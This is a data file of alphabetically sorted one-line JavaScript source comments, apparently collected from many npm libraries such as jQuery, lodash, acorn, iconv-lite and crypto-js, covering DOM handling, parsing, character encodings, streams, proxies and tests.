// @import rule: fetch the resource and evaluate it.
// @media rule: keep searching inside it.
// @other(safe)
// @other(safe-array-of-prim)
// @other(unsafe)
// @params"
// @prim
// @raises LSException
// @return array
// @return boolean
// @return number
// @return reference or null
// @return string
// @return string (to be compiled)
// @return {Number} A bitmask describing the input nodes' relative position."
// @returns LSInput
// @returns Node
// @returns boolean
// @returns int
// @returns string
// @returns {Array} collection of unique nodes, sorted in document order"
// @see http://dom.spec.whatwg.org/#dom-domimplementation-hasfeature
// @see http://www.quirksmode.org/blog/archives/2008/04/delegating_the.html
// @see http://www.quirksmode.org/dom/events/tests/scroll.html
// @see http://www.quirksmode.org/js/events_properties.html
// @see http://www.w3.org/TR/2004/REC-DOM-Level-3-Core-20040407/core.html#Node3-textContent
// @see http://www.w3.org/TR/html5/index.html#events-0
// @see quirksmode.org/bugreports/archives/2004/11/innerhtml_and_t.html
// @see: http://www.w3.org/TR/DOM-Level-2-Style/css.html#CSS-CSSValue
// @todo Delete current URL in favour of the commented out URL rule when this issue is fixed https://github.com/eslint/eslint/issues/7983.
// @ts-ignore 'isUnaryLike' is declared but its value is never read. [6133]
// @ts-ignore - `@types/node` doesn't allow `null` as file path :/
// @type CSSMediaRule|CSSSupportsRule|CSSKeyframesRule|CSSDocumentRule
// @type CSSStyleSheet|CSSMediaRule|CSSSupportsRule|CSSFontFaceRule|CSSKeyframesRule|CSSDocumentRule
// A
// A /32 block.
// A Buffer instance of data to include in the packet (actual data sent to the remote host)
// A DNS lookup in the real world.
// A Def type can only match an object value.
// A Set object means a directory reservation
// A `-->` line comment
// A bit lenient on corruption
// A bit of a combination of:
// A bit simpler than readable streams.
// A bit too dangerous to mutate `next`.
// A catch clause establishes a new scope but the only variable
// A central reference to the root jQuery(document)
// A class definition is always strict mode code.
// A counter to track how many items to wait for before
// A cross-domain request is in order when the origin doesn't match the current origin.
// A destructive slice always unlocks indentation.
// A driver name should be defined and not overlap with the
// A fn is a direct reservation on that path
// A full walk triggers the callback on each node
// A function following one of those tokens is an expression.
// A global GUID counter for objects
// A good approximation of DOM_DELTA_LINE (1) is 5% of viewport size or
// A linearization of the inheritance hierarchy.
// A linked list is used to store data chunks instead of an array because the
// A linked list to keep track of recently-used-ness
// A list of lexically-declared FunctionDeclaration names in the current lexical scope
// A list of lexically-declared names in the current lexical scope
// A list of offsets in the buffer where we need to insert
// A list of var-declared names in the current lexical scope
// A location step of . is short for self::node().
// A location step of .. is short for parent::node()
// A match means we're done; a fail means we have to keep checking
// A particular type AND object properties:
// A path exclusive reservation system
// A previous serialized cache has the most recent items first
// A query
// A readable tar stream creator
// A recursive descent parser operates by defining functions for all
// A recursive walk is one where your functions override the default
// A second argument must be given to configure the parser process.
// A second optional argument can be given to further configure
// A sequence with explicit chaining.
// A sequence without explicit chaining.
// A simple walk is one where you simply specify callbacks to be
// A simple way to check for HTML strings
// A single base 64 digit can contain 6 bits of data. For the base 64 variable
// A special extend for ajax options
// A strict comparison is necessary because `null == undefined`.
// A switch to disallow the identifier reference 'arguments'
// A temporary value used to identify if the loop should be broken.
// A type is an object with a .check method that takes a value and returns
// A-Z
// A-Z 0-9
// A..F
// A..Z
// A.id=object_id(\'table1\') and A.xtype=B.xtype ORDER BY A.colid
// A0 - A7
// A8 - AF
// ACO
// ACTION_TYPES
// ACV
// AFAICT the content of the symlink file itself is the symlink target filename string
// ALPN is supported by Node.js >= v5.
// AMD
// AMD / RequireJS
// AMD. Register as an anonymous module.
// API
// API action to use
// API config
// API that converts from synchronous-callbacks to imperative style.
// API value normalizes line breaks per WHATWG
// API:
// API][api].
// ASC
// ASO
// ASS
// AST walker module for Mozilla Parser API compatible trees
// ASV
// Abandon the binary search at this level.
// Abort any current/pending executions
// Abort any pending executions
// Abort if not done already and return
// Abort if there are pending holds or we're already ready
// Abort if we hit a combinator
// Aborting is no longer a cancellation
// Above-mentioned will work or use this simple form
// Absorb
// Absorb message into state
// Abstract (non-buildable) comment supertype. Not a Node.
// Abstract supertype of all syntactic entities that are allowed to have a
// Abuses a v8 implementation detail for a very fast case
// Accept quoted arguments as-is
// Accepts only:
// Accessing this property makes selected-by-default
// Account for $.scrollspy(function)
// Acorn is organized as a tokenizer and a recursive-descent parser.
// Acorn uses an [operator precedence parser][opp] to handle binary"
// Acorn was written by Marijn Haverbeke, Ingvar Stepanyan, and"
// Acorn: Loose parser
// ActiveX objects in IE.
// Actual Callbacks object
// Actual callback list
// Actual mapping tables consist of chunks. Use them to fill up decode tables.
// Actually add character.
// Actually create all modifier functions
// Actually launch the test
// Actually launch the tests
// Adapt the sometimes-Async api of tough.CookieJar to our requirements
// Adapted from Chris Veness' SHA1 code at
// Add 0x80 byte
// Add GB18030 decode tables.
// Add IV to config
// Add Setting Button
// Add `Array` methods to `lodash.prototype`.
// Add `LazyWrapper` methods for `_.drop` and `_.take` variants.
// Add `LazyWrapper` methods for `_.head` and `_.last`.
// Add `LazyWrapper` methods for `_.initial` and `_.tail`.
// Add `LazyWrapper` methods that accept an `iteratee` value.
// Add `LazyWrapper` methods to `lodash.prototype`.
// Add a callback or a collection of callbacks to the list
// Add a progress sentinel to prevent the fx queue from being
// Add a stub for each driver API method that delays the call to the
// Add aliases.
// Add all accessor Array functions to the wrapper.
// Add all mutator Array functions to the wrapper.
// Add all of the Underscore functions to the wrapper object.
// Add an extra line break if the previous object property
// Add anti-cache in url if needed
// Add break after content.
// Add button/input type pseudos
// Add chain sequence methods to the `lodash` wrapper.
// Add cloned `this` element(s) after target element
// Add content to the buffer.
// Add decoder for versions of Node not supporting CESU-8
// Add element after `this` element
// Add element before `el` element
// Add elements passing elementMatchers directly to results
// Add flags within a leading mode modifier to the overall pattern's flags
// Add form content
// Add function name to `names` array
// Add help strings.
// Add if stateValue === true or we are toggling and there is no value
// Add in properties whose names you wish to fix before
// Add in style property hooks for overriding the default
// Add in the root
// Add in the static methods
// Add lazy aliases.
// Add level2 features
// Add line break mappings between last known mapping and the end of the
// Add list-specific methods
// Add listeners to Deferred subordinates; treat others as resolved
// Add mappings one character at a time for maximum resolution.
// Add matches to results
// Add methods that return unwrapped values in chain sequences.
// Add methods that return wrapped values in chain sequences.
// Add methods to `Hash`.
// Add methods to `LazyWrapper`.
// Add methods to `ListCache`.
// Add methods to `MapCache`.
// Add methods to `SetCache`.
// Add methods to `Stack`.
// Add methods to `lodash.prototype`.
// Add more encoding pairs when needed.
// Add n-1 at a random position in the array
// Add nodes directly
// Add offsetParent borders
// Add padding
// Add properties assigned by `RegExp#exec`.
// Add protocol if not provided (prefilters might expect it)
// Add the `onopen`, `onerror`, `onclose`, and `onmessage` attributes."
// Add the callback
// Add the driver to localForage.
// Add the first object to the stack of traversed objects.
// Add the footer and return the Buffer object.
// Add the location hash via pushState.
// Add the old object onto the stack (as a reference)
// Add the params to varDeclaredNames to ensure that an error is thrown
// Add the remaining (directly-bound) handlers
// Add the source content to the _sourcesContents map.
// Add the top/left cssHooks using jQuery.fn.position
// Add three new nodes to the beginning of a list of nodes:
// Add which for click: 1 === left; 2 === middle; 3 === right
// Add which for key events
// Add your own custom functions to the Underscore object.
// Added to validation errors of propertyNames keyword schema
// Added when support for blob shims was added
// Adding a string works.
// Adding an array works.
// Adding another source node works.
// Adding other stuff doesn't.
// Additional Public API.
// Additional updates were enqueued by componentDidUpdate handlers or
// Adds an additional builder for Expression subtypes
// Adds easing
// Adds leading zeros if shorter than four characters
// Adjust and apply
// Adjust args if there are dependencies
// Adjust internal read offset if an optional read offset was not provided.
// Adjust tracked smart buffer length
// Adjusts internally managed write offset.
// Advance position by one character
// After a reload indexes are preserved
// After a reload the data has been correctly persisted
// After a reload the indexes are recreated
// After another reload the indexes are still there (i.e. they are preserved during autocompaction)
// After serialization and before deserialization hooks with some basic sanity checks
// After this call all Node basic primitives will understand iconv-lite encodings.
// After:
// Alias UNICODE-1-1-UTF-7
// Alias method option to type as per ticket #12004
// Alias with options. Can be layered.
// Aliased as `all`.
// Aliased as `any`.
// Aliased as `include`.
// Aliased as `methods`
// Aliased as `select`.
// Aliased as `unique`.
// Aliases of generated encodings.
// Align the versions to prevent errors.
// All **ECMAScript 5** native function implementations that we hope to use
// All Rights Reserved.
// All attributes are lowercase
// All clean. Most often case.
// All data correctly persisted on disk
// All direct children of another()
// All direct children of baz()
// All direct children of blah()
// All direct children of catch(e) block
// All direct children of nested()
// All done!
// All equal until one of the nodes. The longer one is the descendant.
// All events should have a target; Cordova deviceready doesn't
// All functions have an implicit 'arguments' object in scope
// All in the name of speed."
// All indexes left unchanged and pointing to the same docs
// All japanese encodings are based on JIS X set of standards:
// All non-basic code points < n have been handled already. Find the next
// All of the above are perceived as null.
// All others
// All planets from the solar system were removed
// All processing will now stop.
// All properties except for `generatedLine` and `generatedColumn` can be"
// All the actual chunk generation logic needs to be
// Allow arbitrary length keys
// Allow custom headers/mimetypes and early abort
// Allow for deprecating things in the process of starting up.
// Allow instantiation without the 'new' keyword
// Allow interspersed arguments (true by default).
// Allow other node type for tolerant parsing.
// Allow special events to draw outside the lines
// Allow the keys array to be GC'ed.
// Allowed chars:"
// Allowed token characters:"
// Allows for debugging when the hook is injected on the page.
// Allows only 0-377(octal) i.e. 0-255(decimal).
// Already tested
// Also disable .add unless we have memory (since it would have no effect)
// Also filter out any prototype objects using the circular check.
// Alter tree structure
// Although parentheses wouldn't hurt around sequence
// Although we could make up a name or generate an anonymous
// Always assume duplicates if they aren't passed to the comparison function
// Always choose a random pivot so that an input array which is reverse
// Always ensure that absolute sources are internally stored relative to
// Always munge function parameters
// Always munge identifiers that were declared within the method function
// Always munge non-computed properties of MemberExpressions
// Always munge private keys on object literals defined within a method's
// Always proxy if NO_PROXY is not set.
// Always return an empty object.
// Always skip document fragments
// Always tell the queue task is complete. Execute callback if any was given.
// Always true
// Always use LineTerminator
// Always using Z_SYNC_FLUSH is what cURL does.
// Always write a new HTML skeleton so Webkit and Firefox don't choke on reuse
// Ampersand -> '&-'
// An `NaN` primitive is the only value that is not equal to itself.
// An abstract (non-buildable) base type that provide a commonly-needed
// An ancestor walk builds up an array of ancestor nodes (including
// An ancestor walk keeps an array of ancestor nodes (including the
// An array of all the key names.
// An array of bytes the size of the pool will be passed to init()
// An empty visitor?
// An error occurred trying to establish this SOCKS connection.
// An example of constructing a new type with arbitrary constraints from
// An expression to strip any whitespace between the gtlt and the thing
// An input loses its value after becoming a radio
// An internal function to generate lookup iterators.
// An interspersed arg
// An update here will schedule an update but immediately set
// Anchor tag for parsing the document origin
// Anchor's host property isn't correctly set when s.url is relative
// And HexDigit HexDigit in https://www.ecma-international.org/ecma-262/8.0/#prod-HexEscapeSequence
// And a skip
// And even helper helper methods!
// And prevent from including source-map by browserify
// And returning `undefined` here would break compatibility with
// And the keywords
// Animate to the value specified
// Animations created synchronously will run synchronously
// Anonymize the function expression.
// Anonymous function.
// Any backreference in replacement strings
// Any character with a later instance in the string
// Any declarations that occur inside the catch body that do
// Any greedy/lazy quantifier
// Any native multicharacter token in character class scope (includes octals)
// Any non-fx value stops us from restoring the original display value
// Any other non-undefined value returned from the visitor method
// Any relative (+/-) values have already been
// Anything else let's inspect with %O
// Appears after one second.
// Append
// Append all elements in toAppend to array
// Append text node to each selected elements
// Append the one or two characters with code points equal to those one or
// Append to fragment
// Appends an alert() call to the output buffer *before* the visited node
// Application is only created once.
// Apply all sorts
// Apply any `formatters` transformations
// Apply config defaults
// Apply converter (if not an equivalence)
// Apply custom fields if provided
// Apply default values.
// Apply modifiers
// Apply postFilter
// Apply prefilters
// Apply projection
// Apply relative offset (+=/-=) if specified
// Apply set filters to unmatched elements
// Apply the dataFilter if provided
// Apply unix properties to request
// Applying limit and skip
// Applying the SourceMap can add and remove items from the sources and
// Approximations of internal ECMAScript conversion functions
// Archaic crash bug won't allow us to use `1 - ( 0.5 || 0 )` (#12497)
// Archive(File)    -a---
// Are we running under Rhino?
// Array Functions
// Array.push() is only available in IE5.5+
// Arrays (first element is most significant and so on)
// Arrays (no match since arrays are used as a $in)
// Arrow function bodies are allowed to be expressions.
// ArrowFunctionExpression). Note that types.visit precomputes a
// As a callback:
// As a side-effect the document's load-event will be dispatched.
// As far as an average Hebrew text with no diacritics is concerned, all four"
// As specified here: http://www.ecma-international.org/ecma-262/6.0/#sec-line-terminators
// As this is a case where the user cannot do anything (they didn't call request directly with this URL)
// As workaround one can calculate file size manually
// Aspirational for now.
// Assemble 16 subkeys
// Assert that there is no fall back to http_proxy
// Assertion
// Asserts that following token is given contextual keyword.
// Assign aliases.
// Assign default placeholders.
// Assign to `_` leaving `_.prototype` unchanged to allow chaining.
// Assign to newCache so results back-propagate to previous elements
// Assigning the kCapture property directly saves an expensive
// Assume cyclic values are equal.
// Assume documents is an array of JSON objects and requestApi is a
// Assume equality for cyclic structures. The algorithm for detecting cyclic
// Assume getBoundingClientRect is there when computed position is fixed
// Assume identity mapping if no targetLoc specified.
// Assume jQuery is ready without the ready module
// Assume that strings that start and end with <> are HTML and skip the regex check
// Assume that we're valid as-of now
// Assumes a single number if not a string
// Astral code point; split in surrogate halves
// Async
// Async with callbacks:
// Async with promises:
// Async/Await
// Async/Await:
// At any time, we're pushing body chunks into the entry at WRITEENTRY,"
// At least give some kind of context to the user
// At least two arguments must be Boolean literals.
// At this point info.socket is a regular net.Socket TCP connection between client and client2 (1.2.3.4) (the client which connected to the proxy on the newly bound port.)
// At this point we know the public suffix is listed.
// At-rule
// Attach Socket error handlers.
// Attach a bunch of functions for handling common AJAX events
// Attach a single capturing handler on the document while someone wants focusin/focusout
// Attach comments
// Attach deferreds
// Attach named capture properties
// Attempt to get data from the cache
// Attempt to read more data if we should.
// Attempt to serialize it
// Attempts to complete a multi-byte UTF-8 character using bytes from a Buffer.
// Attempts to complete a partial non-UTF-8 character using bytes from a Buffer
// Attribute selectors: http://www.w3.org/TR/selectors/#attribute-selectors
// Attributes that are booleans
// Augment
// Augment WordArray.init to handle typed arrays
// Auth must happen last in case signing is dependent on other headers
// Auto managed offset
// Auto managed offset   <Buffer 68 65 6c 6c 6f 00>
// Avoid `split(regex)` for IE8 compatibility. See #17.
// Avoid an infinite loop by temporarily removing this function from the getter
// Avoid comment-prolog char sequence (#10098); must appease lint and evade compression
// Avoid costly calculations while the window size is in flux.
// Avoid excessively updating the position while scrolling.
// Avoid hanging onto element (issue #299)
// Avoid running twice; that would reset tokens and could break references to native globals
// Avoid the error which is emitted from 'socket hang up' to cause the fn undefined error on JS runtime.
// Avoid throwing errors for invalid selectors.
// Avoid trying to start too many processing operations. This can occur
// Await/Async (uses a Promise)
// B.cleanup
// B0 - B7
// B8 - BF
// BAD: this pipes garbage to the stream and fails in unexpected ways
// BIG5
// BIND_LEXICAL.
// BMP code point
// BMP codepoint
// BUGGY_GEBTN return comment nodes (ex: IE)
// BUGGY_XXXXX true if method is feature tested and has known bugs
// Babel 6
// Babel block comment.
// Babel extension.
// Babel line comment.
// Babylon 6 differs in AST from Flow
// Back Compat <1.8 extension point
// Backpedal if it does not belong in this list.
// Backreference
// Backreferences in result array
// Backslash (U+005C) starts an escaped character.
// Backslash (char #92) starts an escaped character.
// Backwards compatibility for request.debug
// Backwards-compat with node 0.10.x
// Backwards-compatible blob type serialization strategy.
// Backwards-compatible prefix for the blob type.
// Balancing already-balanced insertions
// Balancing insertions on the left
// Balancing insertions on the right
// Barrett modular reduction
// Base inspection function for prefilters and transports
// Base types
// Base64 ended.
// Based off https://github.com/ForbesLindesay/umd/blob/master/template.js
// Based on John Resig's `tmpl` implementation
// Baseline setup
// Bash completion-related exports
// Basic JavaScript BN library - subset useful for RSA encryption.
// Basic Javascript Elliptic Curve implementation
// Basic char
// Basic matching is possible
// Basic types:
// Basic usage
// Basic usage: Adds \a for ALERT character
// Basic usage; matches numbers within <b> tags
// Basic use
// Be a good stream and emit end when the response is finished.
// Because `do 42 while (cond)` is Syntax Error. We need semicolon.
// Because advance() (called by lex() called by expect()) expects
// Because advance() (called by lex() called by expect()) expects there
// Because we are modifying the entries (by converting string sources and
// Because we will never consider this node or any nodes
// Because we will never consider this node or any nodes after
// Before Symbol spec.
// Before we can validate we need to take care of IDNs with unicode chars.
// Before:
// Below options specified as default values.
// Big ugly regular expressions that match characters in the
// Big5 frequency table
// Big5 has many variations and is an extension of cp950. We use Encoding Standard's as a consensus.
// BigInteger interfaces not implemented in jsbn:
// Binary data needs binary storage
// Binary number in ES6 starts with '0b'.
// Binary search for GB18030. Returns largest i such that table[i] <= val.
// Bind all of an object's methods to that object. Useful for ensuring that
// Bind response
// Bind script tag hack transport
// Bind the function only if `this` value is used
// Bind the function since bound functions do not have a prototype property.
// BindingRestElement only allows BindingIdentifier
// Bit & byte length
// Bits per digit
// Bits to bytes
// Black-hole SVG <use> instance trees (#13180)
// Black-list of terms with double-negative meaning.
// Blackslash (U+005C) marks Unicode escape sequence.
// Blackslash (char #92) marks Unicode escape sequence.
// Blink bug: https://code.google.com/p/chromium/issues/detail?id=229280
// Blobs are not supported in all versions of IndexedDB, notably"
// Block comment ends with '*/'.
// Boolean attributes get special treatment (#10870)
// Boolean envvar handling:
// Boolean functions
// Boolean indicating whether this line can be reindented.
// Boolean properties
// Booleans
// Both ""ISO"" charsets use a completely identical set of code points, whereas"
// Both are experimental and not in the specification yet.
// Both are not empty. Warning: Never call x.concat(y) when you are not
// Both model probers say it's not them. No reason to continue.
// Both result in an extra syscall when you guess wrong.  However, there"
// Bound with placeholders.
// Bounding box calculation (need to minimize displayed area so that
// Break while
// Broadcast to all.
// Broadcast to everyone else.
// Browser builds
// Browser globals
// Browser window
// Browsers encode the checkmark as &#10003; when submitting as iso-8859-1:
// Browsers.
// Buffer in node 4.x < 4.5.0 doesn't have working Buffer.from
// Buffer#write) will replace incomplete surrogates with the unicode
// Buffers
// Bug 571617: eliminate constant-folding
// Bug 591437: rebound args have their defs turned into uses
// Bug 632026: constant-folding
// Bug 632056: constant-folding
// Build QSA regex
// Build a new jQuery matched element set
// Build handshake packet
// Build the signingString
// Building a settings object
// Builds headers hashtable if needed
// Built-in properties that belong on the element
// Built-in protocols
// Bulk operations run against the entire set
// But I don't have time for a cleaner implementation now
// But allow more writes to happen in this tick.
// But aren't Expressions already Nodes? TODO Report this.
// But aren't Expressions and Patterns already Nodes? TODO Report this.
// But eat eager.
// But it is not necessary to discriminate between the two since
// But maintain support for old signatures
// But the URL should still be valid.
// But there is no chance to pop the context if the keyword is consumed as an identifier such as a property name.
// But you can use these new explicit APIs to make clear what you want:
// By default EventEmitters will print a warning if more than
// By default EventEmitters will print a warning if more than 10 listeners are
// By default we always support no auth.
// By modifying the callback parameter the
// By providing a file name as second argument you enable breakpoints
// Byte encodings are:
// Bytes to bits
// C
// C0 - C7
// C8 - CF
// CAUTION: It's deferred to ES7.
// CDATA section
// CDUP is optional
// CESU-8 decoder is not implemented in Node v4.0+
// CESU-8 encoder is also special.
// CESU-8 represents each of Surrogate Pair by 3-bytes
// CESU-8: lead surrogate (D800-DBFF) is also the incomplete character
// CORS
// CR = part boundary
// CSS escapes http://www.w3.org/TR/CSS21/syndata.html#escaped-characters
// CSS quoted string values
// CSS3 UI element states
// CSS3 dynamic pseudo-classes
// CSS3 lang pseudo-class
// CSS3 negation pseudo-class
// CSS3 target pseudo-class
// CSS3 user action pseudo-classes IE & FF3 have native support
// CSS3: syntax scanner and
// CSS4 :matches 
// CSS4 matches pseudo-class
// Cache `Function` properties
// Cache response headers
// Cache the compiled function
// Cache the index of each encountered element
// Cache the length
// Cache the length.
// Cache the resolver
// Cache the tokens
// Caches the header
// Calculate bytelength of string.
// Calculate high and low result of squaring
// Calculate new counter values
// Calculate new state values
// Calculate pageX/Y if missing and clientX/Y available
// Calculate position if both inputs belong to the same document
// Calculate the `url` parameter
// Calculate the g-values
// Calculate the mask's length.
// Call $(...).scrollagent() with a callback function.
// Call Buffer.readXXXX();
// Call `cb(err)` when you are done with this chunk.  If you pass"
// Call `push(newChunk)` to pass along transformed output"
// Call a native DOM method on the target with the same name name as the event.
// Call all callbacks with the given context and arguments
// Call all the callbacks with the given arguments
// Call buffer.writeXXXX();
// Call given func if any
// Call if it was a function and we have a response
// Call lookahead2() with inJSXChild = false because </ should not be considered in the child
// Call lookahead2() with inXJSChild = false because </ should not be considered in the child
// Call the o related callback with the given arguments.
// Call the postDispatch hook for the mapped type
// Call this function to define a new method to be shared by all AST
// Callback
// Callback for when everything is done
// Callback is optional
// Callback version:
// Callbacks
// Callbacks context
// Called after the response is received
// Called at the start of the parse and after every token. Skips
// Called on each scroll
// Called once
// Called only from within defaultDisplay
// Called when element is stuck to viewport
// Called when element is unstuck from viewport
// Called when element reaches bottom of context
// Called when element reaches top of context
// Called when position is recalculated
// Called with the same arguments as .visit.
// Caller can pass in an object of custom data in lieu of the handler
// Calling Def.prototype.build multiple times has the effect of merely
// Calling the .build method of a Def simultaneously marks the type as
// Calling the end function will send the request
// Calling this.checkAllFields for any other type of node is both
// Camel-case
// Can be adjusted by the user
// Can this be made to work?
// Can't auto-inherit these since the XRegExp constructor returns a nonprimitive value
// Can't rely on Object.keys throwing on non objects since ES6{
// Can't trust NodeList.length
// Can't use both modes at once if not _id
// Cancel the request
// Cancel the trailing debounced invocation.
// Cancel the trailing throttled invocation.
// Cannot be done inside the enqueued callback; the documentElement etc. need to be immediately available.
// Cannot be included sooner due to the mutual dependency between parse.js and CSSStyleDeclaration.js
// Cannot be included sooner due to the mutual dependency between parse.js and CSSStyleSheet.js
// Canonicalize encoding name: strip all non-alphanumeric chars and appended year.
// Canvas context properties
// Caps is short for captures
// Capture F5 to reload the base page testPersistence.html not this one
// Capture backticks as-is from the final query string built above.
// Capture executables
// Capturing group
// Caret ranges.
// Carry bit
// Case 1.
// Cases 2 and 3.
// Cast `value` to a string to ensure the value is set correctly. While
// Cast descendant combinators to space
// Cast to a string so we can do equality checks.
// Cast to undefined so the value passed to
// Catch cases where $(document).ready() is called
// Catch the very common case first: immediately a semicolon (char #59).
// Caution; `option.selected` is not updated if `select.multiple` is
// Certain characters need to be escaped so that they can be put into a
// Certain elements can have dimension info if we invisibly show them
// Ch
// Chain its promise to the database readiness.
// Chainable
// Change the `arguments[0]` string primitive to a `String` object that can store properties
// Change the docs in memory
// Char is one of surrogates.
// Char to FreqOrder table , from hz6763"
// Character Mapping Table:
// Character sequence (our own encoding used)
// Characters emitted in case of error.
// Check BOM.
// Check SOCKS proxy to use
// Check SOCKs command option.
// Check SocksCommand for acceptable command.
// Check a avlt against a simple key => [data] object
// Check a bst against a simple key => [data] object
// Check again without any location info.
// Check against all ancestor/preceding elements
// Check against closest ancestor/preceding element
// Check against the constraints
// Check destination
// Check each part's length and allowed chars.
// Check encoding
// Check existing_socket (if provided)
// Check for HTTP or HTTPS Proxy in environment Else default to null
// Check for `exports` after `define` in case a build optimizer adds it.
// Check for bounds.
// Check for circular references and return its corresponding clone.
// Check for consistency
// Check for correct `exec` handling of nonparticipating capturing groups
// Check for custom tokens at the current position
// Check for encoding
// Check for encoding (third param)
// Check for flag y support (Firefox 3+)
// Check for headers option
// Check for initial Buffer
// Check for invalid encoding.
// Check for invalid offset values.
// Check for listener leak
// Check for most common single-character punctuators.
// Check for native tokens (except character classes) at the current position
// Check for non finite/non integers
// Check for offset
// Check for style in case a browser which returns unreliable values
// Check for task list items
// Check for two different Boolean literals in one call.
// Check for vendor prefixed names
// Check if a given callback is in the list.
// Check if b follows a
// Check if class already exists
// Check if data is available.
// Check if div with explicit width and no margin-right incorrectly
// Check if document is XML
// Check if each node (or one of its ancestors) is already contained in the
// Check if encoding is supported
// Check if getElementById returns elements by name
// Check if it quacks like an element
// Check if module is in cache
// Check if property name clashes with already added.
// Check if the class name is currently defined
// Check if the container itself is a React root node.
// Check if the owner object already has a cache
// Check if the value is an array if we don't force a treatment as value
// Check if typed arrays are supported
// Check if we are using an array-specific comparison function
// Check if we can reuse an existing filesystem entry safely and
// Check if we're dealing with a known content-type
// Check if we're setting a value
// Check if we're writing beyond the bounds of the managed data.
// Check is given string ends with `suffix`."
// Check key and flags
// Check readyState before timeout as it changes
// Check result is valid and return it
// Check state lost if the name is set (#11217)
// Check that `component`'s owner is still alive and that `component` is still the current ref
// Check that cyclic values are equal.
// Check that no index was modified
// Check that only keys in array theRemoved were removed
// Check that the store implements its own removeAllCookies(). The default
// Check that ulimit has been set to the correct value
// Check that value is an object with an inspect function on it
// Check that we didn't get one last unshift.
// Check the algorithm against the official list
// Check the avlt constraint are still met and the data is correct
// Check the bst constraint are still met and the data is correct
// Check the loadDatabase generated an error
// Check timeout
// Check to see if IndexedDB is available and if it is the latest
// Check to see if buffer is a properly encoded OAEP message
// Check to see if it's possible to do matchesSelector
// Check to see if this is actually a grouped type
// Check to see if this is serialized content
// Check to see if this is serialized content we need to
// Check to see if we have a response for the expected dataType
// Check two pieces of data coming from the avlt and data are the same
// Check two pieces of data coming from the bst and data are the same
// Check value
// Check whether `__proto__` is supported
// Check whether `document` exists and only run the frame test if so. This ensures the test is
// Check whether domain belongs to a known public suffix."
// Check whether response has a non-0-sized gzip-encoded body
// Checking for a Stream.Duplex instance is faster here instead of inside
// Checking for several possible values
// Checks at most 3 bytes at the end of a Buffer in order to detect an
// Checks for encoding
// Checks for initial size length
// Checks for valid numberic value;
// Checks if an object has a property.
// Checks the timer has not already been removed
// Cherry-pick methods for smaller browserify/rollup/webpack bundles.
// Chi
// Choose mixing block
// Choose the decoding node where we'll write our chars.
// Choose the first element that is related to our preferred document
// Chown should not fail on einval or eperm if non-root.
// Chrome and IE fire non-standard event when selection is changed (and
// Clamp
// Clamp excess bits
// Clarify!
// Class
// Class DBCSCodec reads and initializes mapping tables.
// Class selector
// Classic
// Clean up if we're done firing for good
// Clean up the event in case it is being reused
// Clean-up function (fires after converters)
// Cleanly remove existing nodes from their previous structures.
// Cleanup code by stripping empty strings.
// Clear all callbacks and values
// Clear buffer
// Clear input after sorting to release objects
// Clear out all listeners. Any in-flight or upcoming events should not get delivered.
// Clear the children first:
// Clear timeout if it exists
// Clear up the last queue stop function
// ClientRequest.OutgoingMessage.setHeader in node 0.12
// Clone each X64Word object
// Clone key for inner and outer pads
// Clone the ordering so it cannot be dynamically mutated.
// Clone to avoid manipulating the comparator's semver object.
// Closing brace
// Code borrowed from PouchDB. See:"
// Code here doesn't run because the promise is rejected!
// Code here never runs because there are rejected promises!
// Codec is not chosen yet. Accumulate initial bytes.
// Codec itself.
// Codec.
// Coerce booleans to `1` or `0` and dates to milliseconds.
// Coerce dates and booleans to numeric primitive values. Dates are compared by their
// Coerce string value into JS value
// Coercion.
// Collect all the original child paths before invoking the callback.
// Collection Functions
// Combinators
// Combine delimiters into one regular expression via alternation.
// Combined Gx and Gy
// Combining several predicates using `_.overEvery` or `_.overSome`.
// Comma and first run
// Command keys insert or clear IME input.
// Command response + incoming connection (bind)
// Comment
// Comment\nerror; }': {
// Comment\nthere; }': {
// Comment\nx; })': {
// CommonJS
// CommonJS require()
// Compaction loop to remove array holes.
// Compare Document Position
// Compare `[[Class]]` names.
// Compare array lengths to determine if a deep comparison is necessary.
// Compare data
// Compare function for sort
// Compare the position of one node against another node in any other document.
// Compensate for old V8 which does not handle invalid flag.
// Compile and execute a filtering function if one is not provided
// Compile the JS `FindProxyForURL()` function into an async function.
// Compile the regexp to match each delimiter.
// Compile the script here so that we don't need to create a instance of VMScript.
// Compiled later after NamedNodeMap is all set up.
// Compiling the current (rather than precompilation) source preserves the effects of nonnative source flags
// Complete
// Completely remove old element
// Complex range `r1 || r2 || ...` is a subset of `R1 || R2 || ...` iff:
// ComponentWillUnmount shall only be called once
// Compose partial arguments.
// Compose partial right arguments.
// Composite/text components don't have any built-in ID: we have to make our own
// Computation
// Compute Constants
// Compute HMAC
// Compute constants
// Compute double table
// Compute inv key schedule
// Compute inverse subkeys
// Compute key schedule
// Compute last byte position
// Compute lookup tables
// Compute multiplication
// Compute next LFSR
// Compute next counter
// Compute number of key schedule rows
// Compute number of rounds
// Compute pi index constants
// Compute rho offset constants
// Compute round constants
// Compute sbox
// Compute this*j + x*k (simultaneous multiplication)
// Computed properties can only be used with full notation.
// Computed unit is not pixels. Stop here and return.
// Concat
// Concurrency level
// Condense equivalence converters
// Configure localforage to display NeDB name for now. Would be a good idea to let user use his own app name
// Connect response
// Constants
// Constants for whatToShow
// Constants returned by acceptNode
// Constants returned by startElement and acceptNode
// Constants table
// Constants tables
// Construct high and low argument for squaring
// Construct the array of async function names to add `await` calls to.
// Constructor(TypedArray array)
// Constructor(sequence<type> array)
// Constructor(unsigned long length)
// Consume `import` as an identifier for `import.meta`.
// Consumes a specified amount of bytes from the buffered data.
// Consumes a specified amount of bytes or characters from the buffered data.
// Consumes a specified amount of characters from the buffered data.
// Consumes contextual keyword if possible.
// Content editable or old IE textarea.
// Contents
// Context for global events is callbackContext if it is a DOM node or jQuery collection
// Context to use when determining if on screen
// Context to watch scroll events
// Continuation byte
// Continuous Integration mode
// Convenience version of a common use case of `filter`: selecting only objects
// Convenience version of a common use case of `find`: getting the first object
// Convenience version of a common use case of `map`: fetching a property.
// Conver the blob to a binaryArray and then to a string.
// Convert
// Convert String-formatted options into Object-formatted ones
// Convert UTF-8 strings to hex
// Convert anything to text
// Convert binary arrays to a string and prefix the string with
// Convert buffers to uint8
// Convert dashed to camelCase; used by the css and data modules
// Convert data if not already a string
// Convert each of the elements to its value(s)
// Convert encoding streaming example
// Convert existing expression atom to assignable pattern
// Convert from an encoded buffer to js string.
// Convert from js string to an encoded buffer.
// Convert hash to 32-bit word array before returning
// Convert html into DOM nodes
// Convert list of expression atoms to binding list.
// Convert methods by ary cap.
// Convert no matter what (that way responseXXX fields are always set)
// Convert non-html into a text node
// Convert options from String-formatted to Object-formatted if needed
